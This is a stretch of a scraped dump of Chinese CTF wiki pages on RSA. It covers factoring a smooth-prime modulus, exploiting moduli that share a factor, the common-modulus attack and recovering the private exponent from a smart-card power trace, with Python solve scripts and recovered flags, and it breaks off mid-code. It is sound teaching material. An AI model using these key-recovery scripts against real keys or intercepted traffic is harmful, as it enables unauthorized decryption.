Key Algorithm: rsaEncryption\n                Public-Key: (1024 bit)\n                Modulus:\n                    00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe:\n                    48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0:\n                    c5:c2:7b:67:03:5a:ec:19:2b:37:41:dd:1f:4d:12:\n                    75:31:b0:7a:b0:12:eb:86:24:1c:09:c0:81:49:9e:\n                    69:ef:5a:ea:c7:8d:c6:23:0d:47:5d:a7:ee:17:f0:\n                    2f:63:b6:f0:9a:2d:38:1d:f9:b6:92:8e:8d:9e:07:\n                    47:fe:ba:24:8b:ff:df:f8:9c:df:af:47:71:65:89:\n                    19:b6:98:1c:9e:14:28:e9:a5:34:25:ca:2a:31:0a:\n                    a6:d7:60:83:31:18:ee:0d:71\n                Exponent: 65537 (0x10001)\n    Signature Algorithm: sha256WithRSAEncryption\n         78:92:11:fb:6c:e1:7a:f7:2a:33:b8:8b:08:a7:f7:5b:de:cf:\n         62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3:\n         32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46:\n         f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c:\n         6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96:\n         bf:5b:a7:ee:8b:1e:48:a7:d2:43:06:0e:4f:5a:86:62:69:05:\n         e2:c0:bd:4e:89:c9:af:04:4a:77:a2:34:86:6a:b8:d2:3b:32:\n         b7:39\nModulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71\n```\n\n可以看出模数只有 1024 比特。而且，根据题目名 very smooth，应该是其中一个因子比较 smooth，这里我们利用 primefac 分别尝试 Pollard's p − 1 与 Williams's p + 1 算法，如下\n\n```shell\n➜  _s.pcap.extracted git:(master) python -m primefac -vs -m=p+1  149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897\n\n149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897: p+1 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897\nZ309  =  P155 x P155  =  11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 x 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897\n```\n\n可以发现当使用 Williams's *p* + 1 算法时，就直接分解出来了。按道理这个因子是 p-1 似乎更光滑，但是却并不能使用 Pollard's p − 1 算法分解，这里进行进一步的测试\n\n```shell\n➜  _s.pcap.extracted git:(master) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002\n\n1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002: 2 7 43 503 761429 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823\nZ154  =  P1 x P1 x P2 x P3 x P6 x P142  =  2 x 7 x 43 x 503 x 761429 x 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823\n\n➜  _s.pcap.extracted git:(master) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 \n\n1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000: 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5\nZ154  =  P1^185 x P1^62 x P1^97  =  2^185 x 3^62 x 5^97\n```\n\n可以看出，对于 p-1 确实有很多小因子，但是个数太多，这就会使得进行枚举的时候出现指数爆炸的情况，因此没有分解出来。\n\n进而根据分解出来的数构造私钥\n\n```python\nfrom Crypto.PublicKey import RSA\nimport gmpy2\n\n\ndef main():\n    n = 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L\n    p = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001L\n    q = 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L\n    e = 65537L\n    priv = RSA.construct((n, e, long(gmpy2.invert(e, (p - 1) * (q - 1)))))\n    open('private.pem', 'w').write(priv.exportKey('PEM'))\n\n\nmain()\n```\n\n最后，将私钥导入到 wireshark 中即可得到明文（Edit -> Preferences -> Protocols -> SSL -> RSA Key List）。\n\n```html\n<html>\n<head><title>Very smooth</title></head>\n<body>\n<h1>\nAnswer: One of these primes is very smooth.\n</h1>\n</body>\n</html>\n```\n\n### 扩展\n\n关于更多的一些分解模数 N 的方法可以参考 https://en.wikipedia.org/wiki/Integer_factorization。\n\n## 模不互素\n\n### 攻击原理\n\n当存在两个公钥的 N 不互素时，我们显然可以直接对这两个数求最大公因数，然后直接获得 p，q，进而获得相应的私钥。\n\n### SCTF RSA2 \n\n这里我们以 SCTF rsa2 为例进行介绍。直接打开 pcap 包，发现有一堆的消息，包含 N 和 e，然后试了试不同的 N 是否互素，我试了前两个\n\n```python\nimport gmpy2\nn1 = 20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031\nn2 = 19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943\nprint gmpy2.gcd(n1, n2)\n```\n\n结果发现竟然不互素。\n\n```shell\n➜  scaf-rsa2 git:(master) ✗ python exp.py\n122281872221091773923842091258531471948886120336284482555605167683829690073110898673260712865021244633908982705290201598907538975692920305239961645109897081011524485706755794882283892011824006117276162119331970728229108731696164377808170099285659797066904706924125871571157672409051718751812724929680249712137\n```\n\n那么我们就可以直接来解密了，这里我们利用第一对公钥密码。代码如下\n\n```python\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEP\nimport gmpy2\nfrom base64 import b64decode\nn1 = 20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031\nn2 = 19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943\np1 = gmpy2.gcd(n1, n2)\nq1 = n1 / p1\ne = 65537\nphin = (p1 - 1) * (q1 - 1)\nd = gmpy2.invert(e, phin)\ncipher = 0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7\nplain = gmpy2.powmod(cipher, d, n1)\nplain = hex(plain)[2:]\nif len(plain) % 2 != 0:\n    plain = '0' + plain\nprint plain.decode('hex')\n```\n\n最后解密如下\n\n```shell\n➜  scaf-rsa2 git:(master) ✗ python exp.py       \nsH1R3_PRlME_1N_rsA_iS_4ulnEra5le\n```\n\n解压压缩包即可。\n\n## 共模攻击\n\n### 攻击条件\n\n当两个用户使用相同的模数 N、不同的私钥时，加密同一明文消息时即存在共模攻击。\n\n### 攻击原理\n\n设两个用户的公钥分别为 $e_1$ 和 $e_2$，且两者互质。明文消息为 $m$，密文分别为：\n\n$$\nc_1 = m^{e_1}\\bmod N \\\\\nc_2 = m^{e_2}\\bmod N\n$$\n\n当攻击者截获 $c_1$ 和 $c_2$ 后，就可以恢复出明文。用扩展欧几里得算法求出 $re_1+se_2=1\\bmod n$ 的两个整数 $r$ 和 $s$，由此可得：\n\n$$\n\\begin{align*}\nc_{1}^{r}c_{2}^{s} &\\equiv m^{re_1}m^{se_2}\\bmod n\\\\\n&\\equiv m^{(re_1+se_2)} \\bmod n\\\\\n&\\equiv m\\bmod n\n\\end{align*}\n$$\n\n### XMan 一期夏令营课堂练习\n\n题目描述：\n\n```\n{6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,773}\n\n{6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,839}\n\nmessage1=3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349\n\nmessage2=5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535\n```\n\n> 题目来源：XMan 一期夏令营课堂练习 \n\n可以看出两个公钥的 N 是一样的，并且两者的 e 互素。写一个脚本跑一下：\n\n```python\nimport gmpy2\nn = 6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249\ne1 = 773\n\ne2 = 839\n\nmessage1 = 3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349\n\nmessage2 = 5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535\n# s & t\ngcd, s, t = gmpy2.gcdext(e1, e2)\nif s < 0:\n    s = -s\n    message1 = gmpy2.invert(message1, n)\nif t < 0:\n    t = -t\n    message2 = gmpy2.invert(message2, n)\nplain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n\nprint plain\n```\n\n得到\n\n```shell\n➜  Xman-1-class-exercise git:(master) ✗ python exp.py\n1021089710312311910410111011910111610410511010710511610511511211111511510598108101125\n```\n\n这时候需要考虑当时明文是如何转化为这个数字了，一般来说是 16 进制转换，ASCII 字符转换，或者 Base64 解密。这个应该是 ASCII 字符转换，进而我们使用如下代码得到 flag\n\n```python\ni = 0\nflag = \"\"\nplain = str(plain)\nwhile i < len(plain):\n    if plain[i] == '1':\n        flag += chr(int(plain[i:i + 3]))\n        i += 3\n    else:\n        flag += chr(int(plain[i:i + 2]))\n        i += 2\nprint flag\n```\n\n这里之所以使用 1 来判断是否为三位长度，是因为 flag 一般都是明文字符，而 1 开头的长度为 1 或者 2 的数字，一般都是不可见字符。\n\nflag\n\n```shell\n➜  Xman-1-class-exercise git:(master) ✗ python exp.py\nflag{whenwethinkitispossible}\n```\n\n## 题目\n\n- Jarvis OJ very hard RSA\n", "timestamp": "2025-10-21T22:02:48.871735"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/asymmetric/rsa/rsa_side_channel.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/asymmetric/rsa/rsa_side_channel.md", "content": "# RSA 侧信道攻击\n\n能量分析攻击（侧信道攻击）是一种能够从密码设备中获取秘密信息的密码攻击方法．与其\n他攻击方法不同：这种攻击利用的是密码设备的能量消耗特征，而非密码算法的数学特性．能量分析攻击是一种非入侵式攻击，攻击者可以方便地购买实施攻击所需要的设备：所以这种攻击对智能卡之类的密码设备的安全性造成了严重威胁。\n\n能量分析攻击是安全领域内非常重要的一个部分，我们只在这里简单讨论下。\n\n能量分析攻击分为：\n- 简单能量分析攻击（SPA），即对能量迹进行直观分析，肉眼看即可。\n- 差分能量分析攻击（DPA），基于能量迹之间的相关系数进行分析。\n\n## 攻击条件\n\n攻击者可获取与加解密相关的侧信道信息，例如能量消耗、运算时间、电磁辐射等等。\n\n## 例子\n这里我们以 HITB 2017 的 Hack in the card I 作为例子。\n\n题目给出了公钥文件 `publickey.pem`，密文，测量智能卡功率的电路图，和**解密**过程中智能卡消耗的功率变化（通过在线网站给出 [trace](http://47.74.147.53:20015/index.html)）。\n\n![Circuit diagram](./figure/circuitdiagram.png)\n\n密文：\n```\n014b05e1a09668c83e13fda8be28d148568a2342aed833e0ad646bd45461da2decf9d538c2d3ab245b272873beb112586bb7b17dc4b30f0c5408d8b03cfbc8388b2bd579fb419a1cac38798da1c3da75dc9a74a90d98c8f986fd8ab8b2dc539768beb339cadc13383c62b5223a50e050cb9c6b759072962c2b2cf21b4421ca73394d9e12cfbc958fc5f6b596da368923121e55a3c6a7b12fdca127ecc0e8470463f6e04f27cd4bb3de30555b6c701f524c8c032fa51d719901e7c75cc72764ac00976ac6427a1f483779f61cee455ed319ee9071abefae4473e7c637760b4b3131f25e5eb9950dd9d37666e129640c82a4b01b8bdc1a78b007f8ec71e7bad48046\n```\n\n### 分析\n由于网站只给出了一条能量迹，所以可以断定这是 Simple channel analysis（SPA）攻击。那么我们可以直接通过观察能量迹的高低电平来获得 RSA 解密过程的密钥 d。\nRSA 可被 SPA 攻击的理论基础来自于 RSA 中包含的快速幂取余算法。\n\n\n快速幂算法如下\n\n1. b 为偶数时，$a^b \\bmod c = ({a^2}^{b/2}) \\bmod c$。\n2. b 为奇数时，$a^b \\bmod c = ({a^2}^{b/2} \\times a) \\bmod c$。\n\n相应的 C 代码实现为：\n```c\nint PowerMod(int a, int b, int c)\n{\n    int ans = 1;\n    a = a % c;\n    while(b>0) {\n        if(b % 2 == 1) // 当b为奇数时会多执行下面的指令\n\t        ans = (ans * a) % c;\n        b = b/2;\n        a = (a * a) % c;\n    }\n    return ans;\n}\n```\n\n由于快速幂的计算过程中会逐位判断指数的取值，并会采取不同的操作，所以可从能量迹中还原出 d 的取值（从上面可知，直接得到的值是 d 的二进制取值的**逆序**）。\n\n**注意**：\n\n> 有时候模乘也可能会从高位向低位进行模乘。这里是从低位向高位模乘。\n\n![](./figure/trace.png)\n\n由此可给出还原 d 的脚本如下：\n\n```python\nf = open('./data.txt')\ndata = f.read().split(\",\")\nprint('point number:', len(data))\n\nstart_point = 225   # 开始分析的点\nmid = 50            # 采样点间隔\nfence = 228         # 高低电平分界线\n\nbin_array = []\n\nfor point_index in range(start_point, len(data), mid):\n    if float(data[point_index]) > fence:\n        bin_array.append(1)\n    else:\n        bin_array.append(0)\n\nbin_array2 = []\nflag1 = 0\nflag2 = 0\nfor x in bin_array:\n    if x:\n        if flag1:\n            flag2 = 1\n        else:\n            flag1 = 1\n    else:\n        if flag2:\n            bin_array2.append(1)\n        else:\n            bin_array2.append(0)\n        flag1 = 0\n        flag2 = 0\n\n# d_bin = bin_array2[::-1]\nd_bin = bin_array2\nd = \"\".join(str(x) for x in d_bin)[::-1]\nprint(d)\nd_int = int(d,2)\nprint(d_int)\n```\n## 参考资料\n1. Mangard, S., Oswald, E., Popp, T., 冯登国, 周永彬, & 刘继业. (2010). 能量分析攻击.\n", "timestamp": "2025-10-21T22:02:49.086075"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/crypto/asymmetric/rsa/rsa_theory.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/asymmetric/rsa/rsa_theory.md", "content": "# RSA 介绍\n\nRSA 加密算法是一种非对称加密算法。在公开密钥加密和电子商业中 RSA 被广泛使用。RSA 是 1977 年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。RSA 就是他们三人姓氏开头字母拼在一起组成的。\n\nRSA 算法的可靠性由极大整数因数分解的难度决定。换言之，对一极大整数做因数分解愈困难，RSA 算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用 RSA 加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。如今，只有短的 RSA 密钥才可能被强力方式解破。到 2017 年为止，还没有任何可靠的攻击 RSA 算法的方式。\n\n## 基本原理\n\n### 公钥与私钥的产生\n\n1. 随机选择两个不同大质数 $p$ 和 $q$，计算 $N = p \\times q$\n2. 根据欧拉函数，求得 $\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1)$\n3. 选择一个小于 $\\varphi (N)$ 的整数 $e$，使 $e$ 和 $\\varphi (N)$ 互质。并求得 $e$ 关于 $\\varphi (N)$ 的模反元素，命名为 $d$，有 $ed\\equiv 1 \\pmod {\\varphi (N)}$\n4. 将 $p​$ 和 $q​$ 的记录销毁\n\n此时，$(N,e)$ 是公钥，$(N,d)$ 是私钥。\n\n### 消息加密\n\n首先需要将消息 以一个双方约定好的格式转化为一个小于 $N$，且与 $N$ 互质的整数 $m$。如果消息太长，可以将消息分为几段，这也就是我们所说的块加密，后对于每一部分利用如下公式加密：\n\n$$\nm^{e}\\equiv c\\pmod N\n$$\n\n### 消息解密\n\n利用密钥 $d​$ 进行解密。\n\n$$\nc^{d}\\equiv m\\pmod N\n$$\n\n### 正确性证明\n\n即我们要证$m^{ed} \\equiv m \\bmod N$，已知$ed \\equiv 1 \\bmod \\phi(N)$，那么 $ed=k\\phi(N)+1$，即需要证明\n\n$$\nm^{k\\phi(N)+1}  \\equiv m \\bmod N\n$$\n\n这里我们分两种情况证明\n\n第一种情况 $gcd(m,N)=1​$，那么 $m^{\\phi(N)} \\equiv 1 \\bmod N​$，因此原式成立。\n\n第二种情况 $gcd(m,N)\\neq 1$，那么 $m$ 必然是 $p$ 或者 $q$ 的倍数，并且 $n=m$ 小于 $N$。我们假设\n\n$$\nm=xp\n$$\n\n那么 $x$ 必然小于 $q$，又由于 $q$ 是素数。那么\n\n$$\nm^{\\phi(q)} \\equiv 1 \\bmod q\n$$\n\n进而\n\n$$\nm^{k\\phi(N)}=m^{k(p-1)(q-1)}=(m^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q\n$$\n\n那么\n\n$$\nm^{k\\phi(N)+1}=m+uqm\n$$\n\n进而\n\n$$\nm^{k\\phi(N)+1}=m+uqxp=m+uxN\n$$\n\n所以原式成立。\n\n## 基本工具\n\n### RSAtool\n\n-   安装\n\n    ```bash\n    git clone https://github.com/ius/rsatool.git\n    cd rsatool\n    python rsatool.py -h\n    ```\n\n-   生成私钥\n\n    ```bash\n    python rsatool.py -f PEM -o private.pem -p 1234567 -q 7654321\n    ```\n\n### RSA Converter\n\n- 根据给定密钥对，生成 pem 文件\n- 根据 $n$，$e$，$d$ 得出 $p$，$q$\n\n### openssl\n\n-   查看公钥文件\n\n    ```shell\n    openssl rsa -pubin -in pubkey.pem -text -modulus\n    ```\n\n-   解密\n\n    ```shell\n    rsautl -decrypt -inkey private.pem -in flag.enc -out flag\n    ```\n\n更加具体的细节请参考 `openssl --help`。\n\n### 分解整数工具\n\n- 网站分解，[factor.db](http://factordb.com/)\n- 命令行分解，[factordb-pycli](https://github.com/ryosan-470/factordb-pycli)，借用 factordb 数据库。\n- [yafu](https://sourceforge.net/projects/yafu/)\n\n### python 库\n\n#### primefac\n\n整数分解库，包含了很多整数分解的算法。\n\n#### gmpy\n\n- `gmpy.root(a, b)`，返回一个元组 `(x, y)`，其中 `x` 为 `a` 开 `b` 次方的值，`y` 是判断 `x` 是否为整数的布尔型变量\n\n#### gmpy2\n\n安装时，可能会需要自己另行安装 mpfr 与 mpc 库。\n\n- `gmpy2.iroot(a, b)`，类似于 `gmpy.root(a,b)`\n\n#### pycrypto\n\n-   安装\n\n    ```bash\n    sudo pip install pycrypto\n    ```\n\n-   使用\n\n    ```python\n    import gmpy\n    from Crypto.Util.number import *\n    from Crypto.PublicKey import RSA\n    from Crypto.Cipher import PKCS1_v1_5\n\n    msg = 'crypto here'\n    p = getPrime(128)\n    q = getPrime(128)\n    n = p*q\n    e = getPrime(64)\n    pubkey = RSA.construct((long(n), long(e)))\n    privatekey = RSA.construct((long(n), long(e), long(d), long(p), long(q)))\n    key = PKCS1_v1_5.new(pubkey)\n    enc = key.encrypt(msg).encode('base64')\n    key = PKCS1_v1_5.new(privatekey)\n    msg = key.decrypt(enc.decode('base64'), e)\n    ```\n\n## Jarvis OJ - Basic - veryeasyRSA\n\n> p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389\n>\n> e = 65537\n>\n> 求 d = \n>\n> 请提交 `PCTF{d}`\n\n直接根据 $ed\\equiv 1 \\pmod{\\varphi (N)}$，其中 $\\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1)$，可得 $d$。\n\n```python\nimport gmpy2\np = 3487583947589437589237958723892346254777\nq = 8767867843568934765983476584376578389\ne = 65537\nphin = (p - 1) * (q - 1)\nprint gmpy2.invert(e, phin)\n```\n\n```shell\n➜  Jarvis OJ-Basic-veryeasyRSA git:(master) ✗ python exp.py       \n19178568796155560423675975774142829153827883709027717723363077606260717434369\n```\n\n## 2018 CodeGate CTF Rsababy\n\n程序就是一个简单的 RSA，不过程序还生成了两个奇怪的数\n\n```python\ne = 65537\nn = p * q\npi_n = (p-1)*(q-1)\nd = mulinv(e, pi_n)\nh = (d+p)^(d-p)\ng = d*(p-0xdeadbeef)\n```\n\n所以，问题应该出自这里，所以我们就从此下手，不放这里先假设 `const = 0xdeadbeef`。那么\n\n$$\neg = ed * (p-const)\n$$\n\n进而，根据 RSA 可知\n\n$$\n2^{eg}=2^{ed * (p-const)}=2^{p-const} \\pmod n\n$$\n\n$$\n2^{p-const} * 2^{const-1} = 2^{p-1} \\pmod n\n$$\n\n所以\n\n$$\n2^{p-1} = 2^{eg} * 2^{const-1}+kn\n$$\n\n而与此同时根据费马小定理，我们知道\n\n$$\n2^{p-1} \\equiv 1 \\pmod p\n$$\n\n所以\n\n$$\np|2^{p-1}-1 | 2^{eg+const-1}-1+kn\n$$\n\n进而\n\n$$\np|2^{eg+const-1}-1\n$$\n\n所以\n\n$$\np|gcd(2^{eg+const-1}-1,n)\n$$\n\n因此，代码如下\n\n```python\ntmp = gmpy2.powmod(2,e*g+const-1,n)-1\np = gmpy2.gcd(tmp,n)\nq = n/p\nphin = (p-1)*(q-1)\nd =gmpy2.invert(e,phin)\nplain = gmpy2.powmod(data,d,n)\nprint hex(plain)[2:].decode('hex')\n```\n\n## 2018 国家安全周 pure math\n\n题目的基本描述是这个样子的\n\n```\n1) p ** p % q = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492\n2) q ** q % p = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323\n3) (p ** q + q ** p) % (p*q) = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406\n4) (p+q) ** (p+q) % (p*q) = 63112211860889153729003401381621068190906433969243079543438386686621389392583849748240273643614258173423474299387234175508649197780206757067354426424570586101908571600743792328163163458500138799976944702155779196849585083397395750018148652864158388247163109077215394538930498877175474225571393901460434679279\n5) FLAG ** 31337 % (p*q) = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030\nNow, what’s the FLAG???\n```\n\n我们的目的基本上就是求得 FLAG，那么怎么做呢?这个题目需要我们具有较好的数论功底。\n\n根据题目中这样的内容，我们可以假设 $p$，$q$ 都是大素数，那么\n\n$p^{q-1} \\equiv  1\\bmod q$\n\n那么\n\n$p^{q} \\equiv p \\bmod pq$\n\n那么我们可以根据 3）知道\n\n$p^q+q^p \\equiv p+q \\bmod pq$\n\n而 $p+q$ 又显然小于 $pq$，所以我们就知道 $p+q$ 的数值。\n\n进一步，我们假设1），2），3），4），5）对应的值分别为 $x_1$, $x_2$, $x_3$, $x_4$, $x_5$ 则\n\n根据4），我们可以知道\n\n$(p+q)^{p+q} \\equiv p^{p+q}+q^{p+q} \\bmod pq$\n\n又因为1）和 2），则\n\n$p^pp \\equiv px_1\\bmod pq$\n\n$q^qq \\equiv qx_2 \\bmod pq$\n\n因此\n\n$px_1+qx_2 \\equiv x_4 \\bmod pq$\n\n根据 $x_1$ 和 $x_2$ 的求得方式，我们可以知道这里也是等号，因此我们得到了一个二元一次方程组，直接求解即可。\n\n```python\nimport gmpy2\nx1 = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492\nx2 = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323\np_q = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406\nx4 = 63112211860889153729003401381621068190906433969243079543438386686621389392583849748240273643614258173423474299387234175508649197780206757067354426424570586101908571600743792328163163458500138799976944702155779196849585083397395750018148652864158388247163109077215394538930498877175474225571393901460434679279\n\nif (x4 - x1 * p_q) % (x2 - x1) == 0:\n    print 'True'\nq = (x4 - x1 * p_q) / (x2 - x1)\nprint q\np = p_q - q\n\nc = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030\n\nphin = (p - 1) * (q - 1)\nd = gmpy2.invert(31337, phin)\nflag = gmpy2.powmod(c, d, p * q)\nflag = hex(flag)[2:]\nprint flag.decode('hex')\n```\n\nflag  如下\n\n```shell\n➜  2018-国家安全周第一场-puremath git:(master) ✗ python exp.py\nTrue\n7635093784603905632817000902311635311970645531806863592697496927519352405158721310359124595712780726701027634372170535318453656286180828724079479352052417\nflag{6a66b8d5-6047-4299-a48e-4c4d1f874d12}\n```\n\n## 2018 Pwnhub LHY\n\n首先分析这段代码\n\n```python\nassert gmpy.is_prime(y)**2016 + gmpy.is_prime(x + 1)**2017 + (\n    (x**2 - 1)**2 % (2 * x * y - 1) + 2\n)**2018 == 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146\n```\n\n由于 `gmpy.is_prime` 要么返回1，要么返回 0，所以我们可以很容易地试出来 `y` 是素数，`x+1` 也是素数，并且\n\n$(x^2-1)^2\\equiv 0 \\bmod (2xy-1)$\n\n为了式子能够整除，猜测 $x=2y$ 。\n\n于是，对于下面的内容\n\n```python\np = gmpy.next_prime(x**3 + y**3)\nq = gmpy.next_prime(x**2 * y + y**2 * x)\nn = p * q\nphi = (p - 1) * (q - 1)\nd = gmpy.invert(0x10001, 